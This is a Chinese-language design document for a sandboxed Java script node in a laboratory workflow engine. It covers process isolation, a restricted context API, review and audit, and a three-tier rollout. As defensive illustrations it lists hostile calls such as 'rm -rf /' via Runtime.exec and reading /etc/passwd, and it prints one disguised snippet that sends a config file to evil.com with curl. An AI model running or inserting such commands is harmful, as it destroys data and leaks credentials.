# 自定义脚本节点 — 设计

> **需求**：某个节点需要一段 Java 代码，读程序状态、做处理、把结果放进变量，
> 后续流程用这个变量。
>
> **风险**：上传的代码可以删数据库、发网络请求、耗死进程。
> **这是全系统风险最高的功能**，必须按沙箱设计。

---

## 一、这个功能能干什么

### 1.1 典型场景

| 场景 | 代码做什么 |
|---|---|
| **动态算点位** | 查当前哪些层位空着，算出下一个该用哪个 |
| **按业务规则分流** | 根据样本类型、优先级决定走哪条分支 |
| **数据转换** | 从设备返回的 JSON 里提取复杂结构 |
| **外部系统对接** | 查 LIMS 拿到样本信息（**这是最危险的**） |
| **复杂条件** | 十几个变量组合判断，表达式写不下 |

### 1.2 为什么表达式不够

**表达式只能"算一个值"，不能"查东西"**：

```
表达式：${a + b}                  ✅ 能算
表达式：${查一下哪些位置空着}      ❌ 不能查
表达式：${调 LIMS 接口}            ❌ 不能调
```

**脚本节点就是补这个能力**。

## 二、安全边界（**最关键的部分**）

### 2.1 四级方案对比

| 方案 | 安全 | 灵活 | 工程量 |
|---|---|---|---|
| **A. 直接在主进程执行上传的 .java** | ❌ **极低** | 极高 | 小 |
| **B. 类加载器隔离** | 🟡 低（能反射绕过） | 极高 | 中 |
| **C. 独立进程 + 受限 API** ⭐ | 🟡 **中** | 高 | **中** |
| **D. 只允许预置插件 + 配置** | ✅ 高 | 低 | 小 |

**选 C**（独立进程）：

```java
// 用户代码只能看到 ScriptContext，看不到任何系统类
public class MyScript implements StepScript {
    public Map<String, Object> run(ScriptContext ctx) {
        String plate = ctx.var("plateId");           // 读变量
        int count = ctx.varInt("plateCount");
        List<String> free = ctx.freeSlots("ID1183"); // 受限查询
        return Map.of("nextSlot", free.get(0));      // 返回新变量
    }
}
```

### 2.2 为什么要"独立进程"

**同一个 JVM 里，任何"沙箱"都能被绕过**：

| 绕过方式 | 例子 |
|---|---|
| `System.exit(0)` | 直接杀掉中控 |
| `Runtime.exec("rm -rf /")` | 执行系统命令 |
| `Thread.sleep(Long.MAX)` | 卡死线程 |
| `new byte[2_000_000_000]` | OOM |
| 反射 `Class.forName("com.labos...")` | 访问内部类 |
| `SecurityManager` | **JDK 17 已废弃，JDK 21 移除** |

**只有进程隔离能挡住这些**（至少能 kill）。

### 2.3 沙箱的具体措施

| 措施 | 怎么做 |
|---|---|
| **独立进程** | `java -cp user-scripts.jar`，不继承主进程 classpath |
| **受限 API** | 子进程只加载 `labos-script-api.jar`（几十个方法） |
| **超时** | 主进程 5 秒后 `Process.destroyForcibly()` |
| **内存上限** | `-Xmx256m` |
| **CPU 上限** | `-XX:ActiveProcessorCount=1` |
| **无网络** | 子进程启动时 **不加载网络库**（API jar 里没有） |
| **无数据库** | API jar 里没有 JDBC |
| **工作目录隔离** | 子进程 cwd 指向临时目录，不能读项目文件 |
| **审计** | 每次执行记：谁、什么代码、耗时、返回值 |

### 2.4 受限 API 能做什么

**只能做这些**（`labos-script-api`）：

```java
public interface ScriptContext {
    // 读变量
    String var(String name);
    int varInt(String name);
    double varDouble(String name);
    boolean varBool(String name);

    // 只读查询（不直接连库，由主进程代查后传入）
    List<String> freeSlots(String deviceCode);      // 哪些位置空着
    String deviceStatus(String deviceCode);         // idle/running/fault
    Instant now();

    // 日志（会进 run_event）
    void log(String msg);
}
```

**故意不提供**：

| 不提供 | 为什么 |
|---|---|
| 数据库连接 | 能删库 |
| HTTP 客户端 | 能外传数据 |
| 文件读写 | 能读密钥 |
| 线程/定时器 | 能卡死 |
| 反射入口 | 能绕过限制 |

**要查外部系统怎么办**：**由主进程代查**。

```java
// 用户代码
String sample = ctx.fetchExternal("LIMS", "sample/" + sampleId);
```

**主进程实现**：

```java
// 只允许白名单的"外部数据源"
Map<String, ExternalDataSource> allowed = Map.of(
    "LIMS", limsClient   // 事先配好、有凭证、有超时
);
```

**用户代码只能"请求"，不能"自己发请求"**。

## 三、节点模型

### 3.1 流程里的用法

```json
{
  "nodeType": "script",
  "name": "算出下一个空位",
  "scriptId": "calc-next-slot",
  "version": 3,
  "inputs": ["plateId", "deviceCode"],
  "outputs": ["nextSlot"],          // 声明会产出哪些变量
  "timeoutMs": 5000
}
```

**`scriptId` + `version`** —— 代码是**版本化**的，不是内联在流程里。

### 3.2 为什么版本化而不是内联

| 内联 | 版本化 |
|---|---|
| 流程 JSON 里塞一大段代码 | 代码单独存，流程只引用 |
| 改代码要改流程 | 改代码独立，流程不变 |
| 没法审计 | 每次执行知道用的是哪版 |
| 10 个流程用同一段代码要复制 10 份 | 引用同一个 |

### 3.3 表结构

```sql
CREATE TABLE script (
    id            bigserial PRIMARY KEY,
    tenant_id     bigint NOT NULL,
    code          varchar(64) NOT NULL,        -- 'calc-next-slot'
    name          varchar(128) NOT NULL,
    language      varchar(16) NOT NULL DEFAULT 'java',
    source        text NOT NULL,               -- 完整源码
    compiled_jar  bytea,                       -- 编译产物（可选）
    status        varchar(16) NOT NULL DEFAULT 'draft',
                  -- draft | pending_review | active | disabled
    version       integer NOT NULL DEFAULT 1,
    reviewed_by   bigint,
    reviewed_at   timestamptz,
    created_by    bigint,
    created_at    timestamptz NOT NULL DEFAULT now(),
    UNIQUE (tenant_id, code, version)
);

CREATE TABLE script_execution (
    id            bigserial PRIMARY KEY,
    tenant_id     bigint NOT NULL,
    script_id     bigint NOT NULL,
    version       integer NOT NULL,
    run_id        bigint,
    node_id       bigint,
    input_vars    jsonb,
    output_vars   jsonb,
    ok            boolean NOT NULL,
    error         text,
    duration_ms   integer,
    exit_code     integer,
    created_at    timestamptz NOT NULL DEFAULT now()
);

COMMENT ON TABLE script_execution IS
    '每次脚本执行的审计记录：谁跑了哪版、输入输出、耗时、退出码';
```

### 3.4 状态流转

```
draft ──提交──> pending_review ──审核通过──> active ──停用──> disabled
                    │
                    └──驳回──> draft
```

**`active` 才能被流程引用** —— **draft 的代码不能在生产跑**。

## 四、执行流程

### 4.1 主进程侧

```java
Map<String, Object> runScript(long scriptId, int version,
                              Map<String, Object> inputs) throws Exception {
    Script s = loadScript(scriptId, version);
    if (!"active".equals(s.status())) {
        throw new IllegalStateException("脚本不是 active 状态，不能执行");
    }

    // ① 准备临时目录
    Path tmp = Files.createTempDirectory("labos-script-");

    // ② 写输入（JSON）
    Files.writeString(tmp.resolve("input.json"), toJson(inputs));

    // ③ 起子进程
    ProcessBuilder pb = new ProcessBuilder(
        "java",
        "-Xmx256m", "-XX:ActiveProcessorCount=1",
        "-cp", "/opt/labos/script-runtime/labos-script-api.jar:"
              + "/opt/labos/scripts/" + s.code() + "-v" + version + ".jar",
        "com.labos.script.Runner",
        tmp.toString()
    );
    pb.directory(tmp.toFile());
    pb.redirectErrorStream(true);
    Process p = pb.start();

    // ④ 超时 kill
    if (!p.waitFor(5, TimeUnit.SECONDS)) {
        p.destroyForcibly();
        throw new ScriptTimeout("脚本执行超过 5 秒");
    }

    // ⑤ 读结果
    String out = Files.readString(tmp.resolve("output.json"));
    return fromJson(out);
}
```

### 4.2 子进程侧（`labos-script-api` 提供）

```java
public final class Runner {
    public static void main(String[] args) throws Exception {
        Path dir = Path.of(args[0]);

        // ① 读输入
        Map<String, Object> input = readJson(dir.resolve("input.json"));

        // ② 加载用户类
        StepScript script = loadUserScript();
        ScriptContext ctx = new ContextImpl(input, dir);

        // ③ 执行
        Map<String, Object> output;
        try {
            output = script.run(ctx);
        } catch (Throwable t) {
            writeJson(dir.resolve("error.json"),
                Map.of("message", t.toString()));
            System.exit(1);
            return;
        }

        // ④ 写结果
        writeJson(dir.resolve("output.json"), output);
        System.exit(0);
    }
}
```

### 4.3 为什么用文件而不是 stdin/stdout

| 方式 | 优点 | 缺点 |
|---|---|---|
| **文件** ⭐ | 简单、可调试（人工能看）、无编码问题 | 有磁盘 IO |
| stdin/stdout | 无 IO | 用户代码 `System.out.println` 会污染协议 |
| Unix socket | 双向 | 复杂 |

**选文件** —— 而且**输出文件放在临时目录**，用户代码只能写自己的目录。

## 五、安全风险清单（必须逐条处理）

### 5.1 用户代码能做的"坏事"

| # | 坏事 | 沙箱怎么挡 | 残余风险 |
|---|---|---|---|
| 1 | `System.exit(0)` | 只杀子进程 | ✅ 无 |
| 2 | `Runtime.exec("rm -rf /")` | **挡不住**（子进程有系统权限） | 🔴 **高** |
| 3 | 死循环 | 5 秒 kill | ✅ 无 |
| 4 | `new byte[2GB]` | `-Xmx256m` | ✅ 无 |
| 5 | 读 `/etc/passwd` | **挡不住**（文件系统权限） | 🟠 中 |
| 6 | 连数据库 | API jar 无 JDBC | ✅ 无 |
| 7 | 发 HTTP | API jar 无网络库 | ✅ 无 |
| 8 | 写项目文件 | cwd 在临时目录，但**能写绝对路径** | 🟠 中 |

### 5.2 挡不住的两条，怎么办

**#2 `Runtime.exec` 和 #5 读文件、#8 写文件** —— **进程级沙箱挡不住，需要 OS 级**：

| 措施 | 平台 | 效果 |
|---|---|---|
| **独立系统用户**（`labos-script`） | Linux | 只能读自己的目录 |
| **只读挂载** | Docker | 项目目录只读 |
| **`ulimit`** | Linux | 限制文件打开数、进程数 |
| **SELinux/AppArmor** | Linux | 强制访问控制 |

**Windows**：用低权限用户 + 文件 ACL。

**macOS**（开发环境）：`sandbox-exec`（已废弃但可用）或直接接受风险。

### 5.3 现实的做法

**分级开启**：

| 环境 | 脚本功能 |
|---|---|
| **开发/演示** | 开启，接受风险（没有真实数据） |
| **测试** | 开启，独立用户 |
| **生产** | **默认关闭**，需管理员显式开启 + 审核 |

```json
"lab_profile": {
  "script": {
    "enabled": false,              // 生产默认关
    "requireApproval": true,       // 必须审核
    "timeoutMs": 5000,
    "maxMemoryMb": 256,
    "allowedExternalSources": ["LIMS"]   // 白名单
  }
}
```

## 六、审核与审计

### 6.1 上线前的审核

```
① 开发者写脚本 → draft
② 提交审核 → pending_review
③ 管理员看源码（关键：**必须人看代码**）
④ 通过 → active
```

**为什么必须人看**：

```java
// 这段代码看起来在算点位
public Map<String, Object> run(ScriptContext ctx) {
    ctx.log("calculating...");
    Runtime.getRuntime().exec("curl evil.com/$(cat /opt/labos/config.json)");
    return Map.of("slot", "L1");
}
```

**任何静态分析都可能漏，只有人看源码最可靠。**

### 6.2 运行时的审计

`script_execution` 表记录：

| 字段 | 用途 |
|---|---|
| `script_id` + `version` | 哪一版 |
| `run_id` + `node_id` | 哪个执行的哪个节点 |
| `input_vars` / `output_vars` | 输入输出（便于复现） |
| `duration_ms` / `exit_code` | 性能与失败原因 |

**查询**：

```sql
-- 某个脚本最近 100 次执行
SELECT run_id, ok, duration_ms, error
FROM script_execution WHERE script_id = 12
ORDER BY created_at DESC LIMIT 100;
```

### 6.3 异常行为检测

| 特征 | 可能问题 |
|---|---|
| 执行时间接近 5 秒 | 有人写死循环 |
| 频繁 timeout | 同上 |
| 输出变量数量异常 | 试图污染上下文 |
| 访问了未声明的 `outputs` | **拒绝并告警** |

**第 4 条要强制**：脚本返回的变量**必须在 `outputs` 里声明过**，
否则报错 —— 防止脚本偷偷改别的变量。

## 七、和表达式的关系

| 能力 | 表达式 | 脚本 |
|---|---|---|
| 算术 | ✅ | ✅ |
| 条件 | ✅ | ✅ |
| **查状态**（哪些位置空） | ❌ | ✅ |
| **调外部系统** | ❌ | ✅（白名单） |
| **复杂逻辑** | ❌ | ✅ |
| 安全 | ✅ 高 | 🟡 中 |
| 性能 | 微秒 | **几十到几百毫秒**（起进程） |

**建议顺序**：

```
能用表达式解决的，优先用表达式（安全、快）
表达式写不下的，才用脚本
```

**判断标准**：

| 需求 | 用什么 |
|---|---|
| `${a + 1}` | 表达式 |
| `${查空位}` | **脚本** |
| `${调 LIMS}` | **脚本** |

## 八、实施分级

### L1（现在做）：表达式引擎

**2.5 天**，已在 M1 计划内。

### L2（看需求再做）：脚本节点

| 任务 | 估时 |
|---|---|
| `labos-script-api`（接口 + Runner） | 2 天 |
| 主进程执行器（进程管理 + 超时 + 文件协议） | 3 天 |
| `script` / `script_execution` 表 | 1 天 |
| 编译服务（上传 .java → 编成 jar） | 2 天 |
| 审核流程（draft → active） | 2 天 |
| 前端（代码编辑器 + 版本 + 审核） | 5 天 |
| **合计** | **3 周** |

**建议**：**先做 L1，L2 等有明确需求再做**。

**理由**：

- **L2 风险最高**（任意代码执行）
- **工程量是 L1 的 8 倍**
- **多数"动态"需求用表达式 + 循环就够了**

## 十、待确认

| # | 问题 | 影响 |
|---|---|---|
| 1 | 脚本要**查外部系统**（LIMS/ERP）吗？ | 要的话得做"代查白名单" |
| 2 | 生产环境**允许上传代码**吗？ | 不允许就只做表达式 |

**第 4 点要注意**：每次起 JVM 要 **200-500 毫秒**。
如果一个流程里有 10 个脚本节点，光启动就 2-5 秒。

**优化**：**常驻脚本进程池**（启动一次，复用）—— 但那又降低了隔离性。

**取舍**：隔离 vs 性能。

## 十一、2026-11-05 裁定：先 Java、后 Python，上传脚本 + 引用执行

> 本节记录使用方给出的目标方案；它与 §二 的既有安全取舍有冲突，逐条标明。

**使用方方案（原话要点）**：

1. 以前是用 Java 实现——直接调 Java 类，据此拿到**当前执行实验的相关属性**，查结果、做处理，用于更精细地控制流程。
2. **先支持 Java，Python 次之**。
3. Java 脚本**先上传**，然后在节点里**引用脚本**再执行。
4. 欢迎讨论更好的方式，并把公开实现方法一并记录。

**与既有设计的冲突（必须点名，不能绕过）**：

| 使用方方案 | §二 的既有取舍 | 冲突点 |
|---|---|---|
| 「直接使用 Java 有关类」拿实验属性 | §二.2：同 JVM 内任何沙箱都能被绕过 | **进程内直调内部类 = §二 的 A/B 档**，`ConditionEvaluator.java:8-11` 明确拒绝过这一档 |
| 上传后执行 | §二.3：独立进程 + 受限 API | 二者不冲突，但要先说清「上传的代码跑在哪」 |
| Java 优先、Python 次之 | — | 语言与沙箱正交：Java 可同进程可出进程，Python 只能出进程 |

**最关键的一句**：使用方要的「**能直接用 Java 类读实验属性**」与「**上传代码后执行**」是**两件事**，可以拆开——前者用**编译期插件**实现（不需要沙箱），后者才需要独立进程沙箱。§十三 据此给出三级阶梯。

## 十二、公开实现方法（调研，2026-11-05）

| 产品 | 做法 | 语言 | 沙箱边界 | 本项目可借鉴点 |
|---|---|---|---|---|
| Camunda 8 Script Task | 内置 **FEEL** 引擎；要跑别的语言走 **job worker**（外部进程自己实现） | FEEL / 自定义 | 引擎内置（FEEL 无副作用） | 「内置表达能力有限 → 复杂逻辑外移」的分层 |
| Camunda 7 **Script Connector** | **JSR-223** 引擎注册框架（JS/Kotlin/Groovy + SPI 扩展） | 多语言 | **无**（同 JVM） | 语言可插拔；但同 JVM 方案本项目不采用 |
| Flowable | **JSR-223** scripting API，暴露 `flw` 上下文对象 | 多语言 | 无（同 JVM） | 「上下文对象 + 受限门面」的 API 形态 |
| n8n **Function Node** | 跑在 **V8 isolate** 沙箱（内存/CPU 受限、无文件系统/网络） | JavaScript | V8 isolate（capability sandbox） | 强隔离 + 语言内置，代价是只能用 JS |
| n8n **Code Node（Python）** | 起**独立子进程** | Python | 进程 + 容器 | 与本项目 §四 的「文件协议 + 子进程」一致 |
| 通用沙箱边界 | **WASM**（默认无 syscall）/ **gVisor**（用户态内核拦 syscall）/ **microVM**（Firecracker，约 125ms、约 5MB/VM） | 任意 | WASM / syscall 拦截 / 硬件虚拟化 | 生产级强隔离的三种选型 |
| GraalVM | `Context` + **`SandboxPolicy.ISOLATED`**（独立 heap、独立 VM） | JS/Python/Ruby… | GraalVM ISOLATED | 若坚持同进程多语言，这是唯一像样的档 |
| **运行时事实** | **Nashorn 已于 JDK 15 随 JEP 372 移除**（JDK 11 起 JEP 335 弃用）；替代是 GraalJS / GraalPy | — | — | **JDK 17 上没有任何内置脚本引擎** |

**结论**：

- **同 JVM 跑用户脚本**这一档，本项目**不做**：JDK 17 没有内置引擎（Nashorn 已移除），引 GraalJS/Jython 等于把 `ScriptEngine` 交出去，与 `ConditionEvaluator.java:8-11` 的取舍直接冲突。
- 公开产品里「零风险」的做法只有两类：**预置插件 + 外部 worker**（Camunda 7 的自定义 Connector 也能这么写），或**强沙箱**（V8 isolate / WASM / microVM）。
- 本项目先取**前者**（§十三 T1），需要上传任意代码时再补**后者的轻量版**（独立 JVM 子进程，§十三 T2）。

## 十三、建议：三级阶梯（T1 编译内置 / T2 上传沙箱 / T3 外部服务）

**核心建议：把使用方的两件事拆成三级。第一级不需要沙箱，却正好给到「直接用 Java 类」的体验。**

| 级 | 形态 | 代码从哪来 | 隔离 | 能用 Java 类吗 | 启动开销 | 适用 |
|---|---|---|---|---|---|---|
| **T1 注册式 Java 步骤** ⭐ | 实现 `StepScript` 的类**随内核编译打包**，节点只引用 `code` | 开发者提交 PR，走正常代码评审 | 无（同进程，但代码本身可信） | ✅ 全部 Java 能力 | 0（同进程调用） | **Java 优先**，本项目的起点 |
| **T2 上传沙箱脚本** | 上传 `.java` → 编译成 jar → **独立 JVM 子进程**执行 | 页面上传 | 进程 + 受限 API + 超时/内存/CPU | 🟡 只有 `labos-script-api` | 200–500ms/次 | 需要「不重新发版就改逻辑」 |
| **T3 外部算法服务** | 内核 **HTTP 调**外部服务，服务自己实现 | 独立部署 | 网络边界 | ✅ 任意 | 一次 RPC | 依赖多、计算重、已有服务 |

**为什么 T1 是「更好的办法」**：

- 使用方要的是「**脚本里能直接调 Java 类、读实验属性**」。这件事的本质是**代码可信、与内核同生命周期**——那就没有「上传」这个词，代码本来就在仓库里。
- T1 不需要沙箱、不需要编译服务、不需要审核流程（走的是正常的 PR 评审），**工程量和风险都远小于 §八 的 L2**。
- T1 与 T2 的**节点模型、上下文协议完全一致**：以后要升级到「页面上传」，只是把 `code` 从「编译期注册表」解析成「运行期 jar」，`StepScriptContext` 不变。

**T1 的节点模型**（沿用 §三.1，去掉版本/审核）：

```json
{
  "nodeType": "scriptTask",
  "name": "算出下一个空位",
  "protocolName": "__script",
  "method_params": {
    "code": "calc_next_slot",
    "inputs": ["plateId", "deviceCode"],
    "outputs": ["nextSlot"],
    "timeoutMs": 500
  }
}
```

**T1 的注册表**（编译期，写在代码里）：

```java
// 代码可信：随内核一起编译、一起评审、一起发版
StepScriptRegistry.register("calc_next_slot", (ctx) -> {
    String plate = ctx.var("plateId");
    List<String> free = ctx.freeSlots(ctx.var("deviceCode"));
    return Map.of("nextSlot", free.get(0));
});
```

**T2 与 T1 的唯一差别**：`code` 从「注册表」变成「jar 文件」，执行从「同进程调用」变成「起子进程 + 文件协议」（§四）。**节点 XML 与变量协议不变**——这是这一版设计最重要的收益：**先做 T1，不会浪费。**

## 十四、脚本怎么拿到实验上下文（本项目落点）

**现状（硬事实）**：

| 事实 | 位置 | 影响 |
|---|---|---|
| `GraphRunner` 的构造参数里**没有** `runId` / `workflowId` / `experimentId` / `tenantId` | `GraphRunner.java:210-237` | 执行器自己拿不到「我在跑哪个 run」 |
| 运行期变量是 `Map<String, String>`，**值只能是 String**，**单次 run 内存态** | `GraphRunner.java:93` | 脚本输出必须**扁平化**成 String→String |
| 上下文组装点在 `WorkflowService`：它手里有 `runId`，并在同一处注入变量与输出读取器 | `WorkflowService.java:746,811-824` | **这是注入 `ScriptContext` 的正确位置** |
| `scriptTask` 已在解析器白名单里 | `WorkflowGraphParser.java:194` | 节点能进图，**不用改解析器** |
| 内置节点分派只认 `__setVar` / `__expr`，其余抛错 | `GraphRunner.java:442-461` | 加一个 `__script` 分支即可接上 |
| `protocolName` 以 `__` 开头 → `Kind.BUILTIN`（不找设备、不走驱动） | `WorkflowGraphParser.java:172-174` | `protocolName="__script"` 自然落进内置通道 |

**上下文快照（只读、有限、可审计）**——由 `WorkflowService` 组装后交给脚本：

```java
// 由 WorkflowService 组装（它手里有 runId）
public interface ScriptContext {
    String var(String name);                  // 运行期变量（只读快照）
    Map<String, String> vars();               // 全部变量
    long runId();                             // 当前 run（审计用）
    String nodeKey();                         // 当前节点
    String experimentId();                    // 当前实验（可为空）
    List<String> freeSlots(String deviceCode); // 受控查询（内核代查）
    String deviceStatus(String deviceCode);   // 受控查询（内核代查）
    void log(String msg);                     // 写进 run_event
}
```

**为什么不给脚本直连数据库**：§二.4 已定——「**用户代码只能请求，不能自己发请求**」。`freeSlots` / `deviceStatus` 由内核代查后传入，脚本只看到结果。

**变量回写的硬约束**：`variables` 是 `Map<String, String>`（`GraphRunner.java:93`）。

| 脚本返回值 | 怎么写回 | 结果 |
|---|---|---|
| `{"nextSlot": "L3"}` | 直接用 | ✅ |
| `{"scores": {"A": 1, "B": 2}}` | **必须**序列化成字符串（如 `{"A":1,"B":2}`） | 🟡 后续表达式只能按字符串比 |
| 想回写未声明的 `outputs` | 拒绝并报错 | ❌（§六.3 第 4 条） |

**要支持「结构化变量」就得改运行时类型**——那是另一块（`Map<String,String>` → `Map<String,Object>`），会波及 `ConditionEvaluator` 与 `substitute()`。**建议本期不做**，脚本输出保持扁平。
